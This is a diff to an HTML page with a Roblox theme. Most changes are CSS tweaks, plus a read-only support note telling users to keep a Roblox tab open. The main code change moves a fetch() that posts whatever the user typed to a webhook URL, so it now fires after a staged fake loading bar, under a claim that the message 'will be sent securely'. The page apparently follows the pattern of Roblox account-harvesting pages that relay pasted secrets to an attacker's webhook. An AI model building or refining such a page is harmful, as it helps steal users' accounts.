@@ -19,7 +19,7 @@
     }
     .container {
       background: rgba(255, 255, 255, 0.1);
-      padding: 40px;
+      padding: 30px;
       border-radius: 16px;
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
       text-align: center;
@@ -35,7 +35,7 @@
     }
     input[type="text"] {
       width: 80%;
-      padding: 12px 15px;
+      padding: 10px 12px;
       border: none;
       border-radius: 8px;
       margin-bottom: 10px;
@@ -70,7 +70,7 @@
     }
     .support-button {
       background: #56c1ff;
-      margin-top: 20px;
+      margin-top: 15px;
       padding: 12px 20px;
       font-size: 1em;
       border-radius: 8px;
@@ -90,9 +90,11 @@
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
       margin-top: 15px;
       width: 100%;
-      max-width: 400px;
+      max-width: 380px;
       text-align: left;
       font-size: 0.9em;
+      box-sizing: border-box;
+      overflow: hidden;
     }
     .support-textarea {
       width: 100%;
@@ -104,12 +106,16 @@
       font-size: 0.9em;
       resize: none;
       border: none;
+      box-sizing: border-box;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
     }
     .close-support-button {
       background: #ff5e5e;
       border: none;
       color: white;
-      padding: 12px 20px;
+      padding: 10px 15px;
       font-size: 1em;
       border-radius: 8px;
       cursor: pointer;
@@ -153,9 +159,8 @@
     <button class="support-button" onclick="toggleSupportSection()">Support</button>
     <div class="footer">Your message will be sent securely</div>
     <div class="support-section" id="supportSection">
-      <h2>Support Information</h2>
-      <textarea class="support-textarea">API is down? Please check Roblox tab is open.</textarea>
-      <br>
+      <h2>Support Info</h2>
+      <textarea class="support-textarea" readonly>API is down? Please check Roblox tab is open.</textarea>
       <button class="close-support-button" onclick="toggleSupportSection()">Close Support</button>
     </div>
     <div class="loading-bar-container" id="loadingBarContainer">
@@ -200,24 +205,24 @@
           step++;
           setTimeout(nextStep, 500);
         } else {
-          fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: message })
-          })
-          .then(() => {
-            statusMsg.textContent = '✅ Message sent!';
-            statusMsg.style.color = '#56ff89';
-          })
-          .catch(() => {
-            statusMsg.textContent = '❌ Error sending message.';
-            statusMsg.style.color = '#ff5e5e';
-          });
           setTimeout(() => {
             barContainer.style.display = 'none';
             bar.style.width = '0%';
             texts.forEach(t => t.style.display = 'none');
-          }, 1000);
+            fetch(webhookURL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ content: message })
+            })
+            .then(() => {
+              statusMsg.textContent = '✅ Message sent!';
+              statusMsg.style.color = '#56ff89';
+            })
+            .catch(() => {
+              statusMsg.textContent = '❌ Error sending message.';
+              statusMsg.style.color = '#ff5e5e';
+            });
+          }, 500);
         }
       }
       nextStep();
